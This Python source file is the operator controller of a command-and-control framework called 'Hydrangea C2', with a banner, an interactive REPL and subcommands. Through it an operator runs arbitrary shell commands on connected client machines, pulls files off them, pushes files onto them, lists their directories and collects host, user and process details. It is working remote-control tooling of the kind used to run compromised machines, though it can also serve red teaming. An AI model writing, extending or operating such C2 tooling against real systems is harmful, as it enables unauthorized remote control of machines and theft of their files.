#!/usr/bin/env python3
"""
Hydrangea C2 — Controller (Interactive REPL + classic subcommands)

This adds a *shell-like CLI* with a prompt (e.g. `>> clients`,
`>> exec --client laptop1 --command "uname -a" --shell`) **without changing
any order/protocol mechanism**. The classic script-style subcommands still work.

Usage (REPL):
  python serverctl.py --port 9000 --auth-token supersecret --repl
  # or simply omit a subcommand:
  python serverctl.py --port 9000 --auth-token supersecret

Usage (classic, unchanged):
  python serverctl.py --port 9000 --auth-token supersecret clients
"""
import argparse
import asyncio
import json
import os
import shlex
import shutil
import sys
from datetime import datetime
import subprocess
from typing import Callable, Dict, Optional, Tuple

from common import write_frame, read_frame

# ---------- UI helpers ----------

def _isatty():
    try:
        return sys.stdout.isatty()
    except Exception:
        return False


class UI:
    def __init__(self, use_color: bool = True, show_banner: bool = True, quiet: bool = False):
        self.use_color = use_color and _isatty()
        self.show_banner_flag = show_banner
        self.quiet = quiet
        self.C = {
            "reset": "\x1b[0m",
            "dim": "\x1b[2m",
            "bold": "\x1b[1m",
            "red": "\x1b[31m",
            "green": "\x1b[32m",
            "yellow": "\x1b[33m",
            "blue": "\x1b[34m",
            "magenta": "\x1b[35m",
            "cyan": "\x1b[36m",
            "gray": "\x1b[90m",
        }

    def c(self, s, color):
        if not self.use_color:
            return s
        return f"{self.C.get(color, '')}{s}{self.C['reset']}"

    @property
    def TAG_OK(self):
        return self.c("[+]", "green")

    @property
    def TAG_ERR(self):
        return self.c("[!]", "red")

    @property
    def TAG_INF(self):
        return self.c("[*]", "cyan")

    @property
    def TAG_QUE(self):
        return self.c("[~]", "yellow")

    def banner(self):
        if not self.show_banner_flag or self.quiet:
            return
        art = r"""

   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████ 
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███ 
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███ 
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████ 
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███ 
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███ 
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀  
                                      ███    ███                                                               

              Hydrangea C2 Controller  •  V2.0 (REPL)
"""
        print(self.c(art, "magenta"))

    def rule(self, label=""):
        width = shutil.get_terminal_size((80, 20)).columns
        text = f" {label} " if label else ""
        line = "-" * max(0, width - len(text))
        print(self.c(text, "gray") + self.c(line, "gray"))

    def headline(self, text):
        print(self.c(text, "bold"))

    def kv(self, key, value, key_color="blue"):
        print(f"{self.c(key + ':', key_color)} {value}")

    def hr(self):
        width = shutil.get_terminal_size((80, 20)).columns
        print(self.c("─" * width, "gray"))

    def statusbar(self, left: str, right: str = ""):
        width = shutil.get_terminal_size((80, 20)).columns
        left = self.c(left, "gray")
        right = self.c(right, "gray")
        space = max(1, width - len(_strip_ansi(left)) - len(_strip_ansi(right)))
        print(left + (" " * space) + right)


# small helper to measure strings without ANSI escape codes
import re as _re
_ANSI_RE = _re.compile(r"\x1b\[[0-9;]*m")


def _strip_ansi(s: str) -> str:
    return _ANSI_RE.sub("", s)


def human_size(n):
    try:
        n = int(n)
    except Exception:
        return str(n)
    for unit in ["B", "KB", "MB", "GB", "TB"]:
        if n < 1024.0:
            return f"{n:.0f}{unit}"
        n /= 1024.0
    return f"{n:.0f}PB"


def human_time(epoch):
    try:
        return datetime.fromtimestamp(int(epoch)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "-"


# ---------- wire ----------

async def admin_send(host: str, port: int, auth_token: str, header: dict, payload: bytes = b""):
    reader, writer = await asyncio.open_connection(host, port)
    admin_header = {"type": "ADMIN", "token": auth_token}
    admin_header.update(header)
    await write_frame(writer, admin_header, payload)
    resp, resp_payload = await read_frame(reader)
    writer.close()
    await writer.wait_closed()
    return resp, resp_payload


# ---------- pretty printers ----------

def print_clients(ui: UI, resp: dict):
    if resp.get("type") != "CLIENTS":
        print_error(ui, resp)
        return []
    clients = resp.get("clients", [])
    ui.headline(f"{ui.TAG_OK} Connected clients: {len(clients)}")
    if not clients:
        return []
    for cid in clients:
        print(f"  {ui.c('•', 'gray')} {ui.c(cid, 'bold')}")
    return clients


def print_error(ui: UI, resp: dict):
    err = resp.get("error") or resp.get("type")
    detail = {k: v for k, v in resp.items() if k not in ("type", "size")}
    msg = f"{ui.TAG_ERR} {err}"
    if detail:
        msg += f" {ui.c(str(detail), 'dim')}"
    print(msg)


def print_queued(ui: UI, resp: dict):
    order = resp.get("order", "?")
    extra = []
    for k in ("path", "src", "save_as", "dest", "bytes"):
        if k in resp:
            extra.append(f"{k}={resp[k]}")
    tail = "  " + " ".join(extra) if extra else ""
    print(f"{ui.TAG_QUE} queued: {order}{ui.c(tail, 'dim')}")


def print_exec(ui: UI, client: str, resp: dict, payload: bytes):
    if resp.get("type") != "RESULT_EXEC":
        print_error(ui, resp)
        return
    try:
        result = json.loads(payload.decode("utf-8")) if payload else {}
    except Exception:
        result = {}

    rc = result.get("rc")
    stdout = result.get("stdout", "")
    stderr = result.get("stderr", "")

    status_tag = ui.TAG_OK if rc == 0 else (ui.TAG_INF if rc is not None else ui.TAG_ERR)
    ui.rule(" exec ")
    ui.headline(f"{status_tag} exec on {ui.c(client, 'bold')}  rc={rc}")
    if stderr:
        ui.rule(" stderr ")
        print(stderr.rstrip("\n"))
    ui.rule(" stdout ")
    print(stdout.rstrip("\n") or ui.c("(no output)", "dim"))
    ui.rule()


def print_list(ui: UI, path: str, resp: dict, payload: bytes):
    if resp.get("type") != "RESULT_LIST_DIR":
        if resp.get("type") == "QUEUED":
            print_queued(ui, resp)
            return
        print_error(ui, resp)
        return
    try:
        entries = json.loads(payload.decode("utf-8")) if payload else []
    except Exception:
        entries = []

    ui.rule(" list ")
    ui.headline(
        f"{ui.TAG_OK} {ui.c('Listing', 'bold')} {ui.c(path, 'cyan')}  {ui.c('(' + str(len(entries)) + ' entries)', 'dim')}"
    )

    name_w = max(10, min(50, max((len(e.get("name", "")) for e in entries), default=10)))
    print(f"{ui.c('TYPE', 'dim'):>6}  {ui.c('NAME', 'dim'):<{name_w}}  {ui.c('SIZE', 'dim'):>8}  {ui.c('MTIME', 'dim')}")
    for e in entries:
        tp = "DIR" if e.get("is_dir") else "FIL"
        nm = e.get("name", "")
        sz = human_size(e.get("bytes", 0))
        mt = human_time(e.get("mtime", 0))
        print(f"{tp:>6}  {nm:<{name_w}}  {sz:>8}  {mt}")
    ui.rule()


def print_session(ui: UI, client: str, resp: dict, payload: bytes):
    if resp.get("type") != "RESULT_SESSION_INFO":
        print_error(ui, resp)
        return
    try:
        info = json.loads(payload.decode("utf-8")) if payload else {}
    except Exception:
        info = {}

    ui.rule(" session ")
    ui.headline(f"{ui.TAG_OK} session info for {ui.c(client, 'bold')}")
    ui.kv("Host", f"{info.get('hostname', '?')} ({info.get('system', '?')} {info.get('release', '?')}, {info.get('machine', '?')})")
    ui.kv("User/PID", f"{info.get('user', '?')} / {info.get('pid', '?')}")
    ui.kv("CWD", info.get("cwd", "?"))
    ui.kv("Root base", info.get("root", "?"))
    ui.kv("Python", f"{info.get('python', '?')} @ {info.get('executable', '?')}")
    ui.rule()


# ---------- REPL infra ----------

class NoExitArgumentParser(argparse.ArgumentParser):
    def error(self, message):  # don't sys.exit; raise for REPL handling
        raise ValueError(message)


def build_repl_parser() -> Tuple[argparse.ArgumentParser, Dict[str, argparse.ArgumentParser]]:
    p = NoExitArgumentParser(prog=">>")
    sub = p.add_subparsers(dest="cmd")

    sub.add_parser("clients", help="List connected clients")

    sp = sub.add_parser("ping", help="Ping a client")
    sp.add_argument("--client", required=True)

    sp = sub.add_parser("list", help="List directory on client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--path", default=".")
    sp.add_argument("--wait", action="store_true", help="Wait for result and render")
    sp.add_argument("--timeout", type=float, default=10.0, help="Seconds to wait when --wait")

    sp = sub.add_parser("pull", help="Pull a file from client to server")
    sp.add_argument("--client", required=True)
    sp.add_argument("--src", required=True)
    sp.add_argument("--dest", required=True)

    sp = sub.add_parser("push", help="Push a local file to client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--src", required=True, help="Local path to send")
    sp.add_argument("--dest", required=True, help="Destination path on client")

    sp = sub.add_parser("exec", help="Execute a command on the client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--command", required=True, help='Command string or JSON list (e.g. "[\"ls\",\"-la\"]")')
    sp.add_argument("--shell", action="store_true", help="Run via shell")
    sp.add_argument("--cwd", help="Working directory on client")
    sp.add_argument("--timeout", type=float, default=30.0, help="Seconds to wait for command")

    sp = sub.add_parser("session", help="Fetch session info from client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--timeout", type=float, default=5.0)

    # meta
    sub.add_parser("help", help="Show help or 'help <command>'")
    sub.add_parser("quit", help="Exit the console")
    sub.add_parser("exit", help="Exit the console")

    # Return also a mapping for subparser lookups (for help display)
    subparsers_map = {a.dest: a for a in []}  # placeholder for type clarity
    return p, {sp_prog(p): p for p in sub._name_parser_map.values()}


def sp_prog(p: argparse.ArgumentParser) -> str:
    # Retrieve the subparser's program name (command) robustly
    # argparse stores it in .prog; last token is the subcommand
    return p.prog.split()[-1]


# Optional: minimal readline support (history + command completion for verbs)
try:
    import readline  # type: ignore

    def _setup_readline(commands):
        def completer(text, state):
            options = [c for c in commands if c.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        readline.set_completer(completer)
        readline.parse_and_bind("tab: complete")
        histfile = os.path.expanduser("~/.hydrangea_history")
        try:
            readline.read_history_file(histfile)
        except Exception:
            pass
        import atexit
        atexit.register(lambda: _save_history(histfile))

    def _save_history(path):
        try:
            readline.write_history_file(path)
        except Exception:
            pass
except Exception:
    readline = None
    def _setup_readline(_):
        return


# ---------- REPL loop ----------

async def run_repl(args) -> None:
    ui = UI(use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=False)
    ui.banner()

    repl_parser, sub_map = build_repl_parser()
    commands = sorted([k for k in sub_map.keys() if k not in {"help"}]) + ["help", "quit", "exit"]
    _setup_readline(commands)

    help_header = (
        "Type 'help' to see commands, 'help <cmd>' for details. Examples:\n"
        "  >> clients\n"
        "  >> exec --client laptop1 --command \"uname -a\"\n"
        "  >> list --client laptop1 --path /etc --wait\n"
    )

    while True:
        ui.statusbar(f"\nHydrangea C2 • {args.host}:{args.port}")
        try:
            line = input(ui.c(">> ", "cyan")).strip()
        except (EOFError, KeyboardInterrupt):
            print("\n")
            print(ui.TAG_INF, "Goodbye.")
            return

        if not line:
            continue

        # Allow comments and quick aliases
        if line.startswith("#"):
            continue

        # Let 'help' without args work easily
        if line.lower() in {"help", "?"}:
            ui.rule(" commands ")
            print(help_header)
            for cmd in commands:
                if cmd in ("quit", "exit"):
                    continue
                sp = sub_map.get(cmd)
                if sp:
                    print(f"  {ui.c(cmd, 'bold')}: {sp.description or sp.format_usage().strip()}")
            print("  quit / exit: leave the console")
            ui.rule()
            continue

        # help <cmd>
        if line.lower().startswith("help "):
            _, _, cmd = line.partition(" ")
            sp = sub_map.get(cmd.strip())
            if not sp:
                print(ui.TAG_ERR, f"Unknown command: {cmd}")
                continue
            ui.rule(f" help: {cmd} ")
            print(sp.format_help())
            ui.rule()
            continue

        if line.lower() in {"quit", "exit"}:
            print(ui.TAG_INF, "Goodbye.")
            return

        # Parse the line via argparse
        try:
            ns = repl_parser.parse_args(shlex.split(line))
        except ValueError as e:
            print(ui.TAG_ERR, str(e))
            continue
        except SystemExit:
            # shouldn't happen with NoExitArgumentParser, but guard anyway
            continue

        cmd = getattr(ns, "cmd", None)
        if not cmd:
            print(ui.TAG_ERR, "No command parsed. Type 'help'.")
            continue

        # Dispatch
        if cmd == "clients":
            resp, _ = await admin_send(args.host, args.port, args.auth_token, {"action": "clients"})
            print_clients(ui, resp)
            continue

        if cmd == "ping":
            resp, _ = await admin_send(args.host, args.port, args.auth_token, {"action": "ping", "target_id": ns.client})
            if resp.get("type") == "OK":
                print(f"{ui.TAG_OK} ping sent to {ui.c(ns.client, 'bold')}")
            else:
                print_error(ui, resp)
            continue

        if cmd == "list":
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "list", "target_id": ns.client, "path": ns.path, "wait": ns.wait, "timeout": ns.timeout},
            )
            if ns.wait:
                print_list(ui, ns.path, resp, payload)
            else:
                print_queued(ui, resp)
            continue

        if cmd == "pull":
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "pull", "target_id": ns.client, "src": ns.src, "dest": ns.dest},
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
                hint = f"{ui.c('Note:', 'dim')} file will appear in server storage (or absolute dest) when client completes."
                print(f"{ui.TAG_INF} {hint}")
            else:
                print_error(ui, resp)
            continue

        if cmd == "push":
            if not os.path.isfile(ns.src):
                print(ui.TAG_ERR, f"Local file not found: {ns.src}")
                continue
            try:
                with open(ns.src, "rb") as f:
                    data = f.read()
            except Exception as e:
                print(f"{ui.TAG_ERR} cannot read {ns.src}: {e}")
                continue
            resp, _ = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "push", "target_id": ns.client, "dest": ns.dest, "src_name": os.path.basename(ns.src)},
                data,
            )
            if resp.get("type") == "QUEUED":
                print_queued(ui, resp)
            else:
                print_error(ui, resp)
            continue

        if cmd == "exec":
            cmd_value = ns.command
            try:
                cmd_value = json.loads(cmd_value)  # allow JSON list
            except Exception:
                pass
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "exec", "target_id": ns.client, "cmd": cmd_value, "shell": ns.shell, "cwd": ns.cwd, "timeout": ns.timeout},
            )
            print_exec(ui, ns.client, resp, payload)
            continue

        if cmd == "session":
            resp, payload = await admin_send(
                args.host,
                args.port,
                args.auth_token,
                {"action": "session_info", "target_id": ns.client, "timeout": ns.timeout},
            )
            print_session(ui, ns.client, resp, payload)
            continue

        print(ui.TAG_ERR, f"Unknown command: {cmd}")


# ---------- Classic CLI (unchanged semantics) ----------

async def classic_cli(args):
    ui = UI(use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=args.quiet)

    if not ui.quiet:
        ui.banner()

    if args.subcmd == "clients":
        resp, _ = await admin_send(args.host, args.port, args.auth_token, {"action": "clients"})
        print_clients(ui, resp)
        return

    if args.subcmd == "ping":
        resp, _ = await admin_send(args.host, args.port, args.auth_token, {"action": "ping", "target_id": args.client})
        if resp.get("type") == "OK":
            print(f"{ui.TAG_OK} ping sent to {ui.c(args.client, 'bold')}")
        else:
            print_error(ui, resp)
        return

    if args.subcmd == "list":
        resp, payload = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {"action": "list", "target_id": args.client, "path": args.path, "wait": args.wait, "timeout": args.timeout},
        )
        if args.wait:
            print_list(ui, args.path, resp, payload)
        else:
            print_queued(ui, resp)
        return

    if args.subcmd == "pull":
        resp, _ = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {"action": "pull", "target_id": args.client, "src": args.src, "dest": args.dest},
        )
        if resp.get("type") == "QUEUED":
            print_queued(ui, resp)
            hint = f"{ui.c('Note:', 'dim')} file will appear in server storage (or absolute dest) when client completes."
            print(f"{ui.TAG_INF} {hint}")
        else:
            print_error(ui, resp)
        return

    if args.subcmd == "push":
        try:
            with open(args.src, "rb") as f:
                data = f.read()
        except Exception as e:
            print(f"{ui.TAG_ERR} cannot read {args.src}: {e}")
            return
        resp, _ = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {"action": "push", "target_id": args.client, "dest": args.dest, "src_name": os.path.basename(args.src)},
            data,
        )
        if resp.get("type") == "QUEUED":
            print_queued(ui, resp)
        else:
            print_error(ui, resp)
        return

    if args.subcmd == "exec":
        cmd_value = args.command
        try:
            cmd_value = json.loads(cmd_value)
        except Exception:
            pass
        resp, payload = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {"action": "exec", "target_id": args.client, "cmd": cmd_value, "shell": args.shell, "cwd": args.cwd, "timeout": args.timeout},
        )
        print_exec(ui, args.client, resp, payload)
        return

    if args.subcmd == "session":
        resp, payload = await admin_send(
            args.host,
            args.port,
            args.auth_token,
            {"action": "session_info", "target_id": args.client, "timeout": args.timeout},
        )
        print_session(ui, args.client, resp, payload)
        return


def start_server(args):
    ui = UI(use_color=(not args.no_color), show_banner=(not args.no_banner), quiet=args.quiet)
    ui.rule(" start server ")
    ui.headline(f"{ui.TAG_INF} Starting Hydrangea server...")
    ui.kv("Host", args.host)
    ui.kv("Port", args.port)
    ui.kv("Auth Token", args.auth_token)
    ui.hr()
    cmd = [sys.executable, "server.py", "--host", args.host, "--port", str(args.port), "--auth-token", args.auth_token]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ui.headline(f"{ui.TAG_OK} Server process started (PID {proc.pid})")
    except Exception as e:
        ui.headline(f"{ui.TAG_ERR} Failed to start server: {e}")
    ui.rule()

# ---------- CLI ----------

async def main():
    ap = argparse.ArgumentParser(description="Hydrangea C2 controller (REPL + classic)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--auth-token", required=True)
    ap.add_argument("--start-srv", action="store_true", help="Start server with given parameters")

    # UI flags
    ap.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    ap.add_argument("--no-banner", action="store_true", help="Hide ASCII banner")
    ap.add_argument("--quiet", action="store_true", help="Less chatter")
    ap.add_argument("--repl", action="store_true", help="Force interactive REPL mode")

    sub = ap.add_subparsers(dest="subcmd")

    sub.add_parser("clients", help="List connected clients")

    sp = sub.add_parser("ping", help="Ping a client")
    sp.add_argument("--client", required=True)

    sp = sub.add_parser("list", help="List directory on client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--path", default=".")
    sp.add_argument("--wait", action="store_true", help="Wait for result and render")
    sp.add_argument("--timeout", type=float, default=10.0, help="Seconds to wait when --wait")

    sp = sub.add_parser("pull", help="Pull a file from client to server storage (or absolute path on server)")
    sp.add_argument("--client", required=True)
    sp.add_argument("--src", required=True)
    sp.add_argument("--dest", required=True)

    sp = sub.add_parser("push", help="Push a file from this machine to client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--src", required=True, help="Local path to send")
    sp.add_argument("--dest", required=True, help="Destination path on client")

    sp = sub.add_parser("exec", help="Execute a system command on the client and return output")
    sp.add_argument("--client", required=True)
    sp.add_argument("--command", required=True, help='Command string or JSON list (e.g. "[\"ls\",\"-la\"]")')
    sp.add_argument("--shell", action="store_true", help="Run via shell")
    sp.add_argument("--cwd", help="Working directory on client")
    sp.add_argument("--timeout", type=float, default=30.0, help="Seconds to wait for command")

    sp = sub.add_parser("session", help="Fetch session info from client")
    sp.add_argument("--client", required=True)
    sp.add_argument("--timeout", type=float, default=5.0)

    args = ap.parse_args()

    if args.start_srv:
        print("Starting server...")
        start_server(args)

    # REPL when --repl or no subcommand
    if args.repl or not args.subcmd:
        await run_repl(args)
    else:
        await classic_cli(args)


if __name__ == "__main__":
    asyncio.run(main())
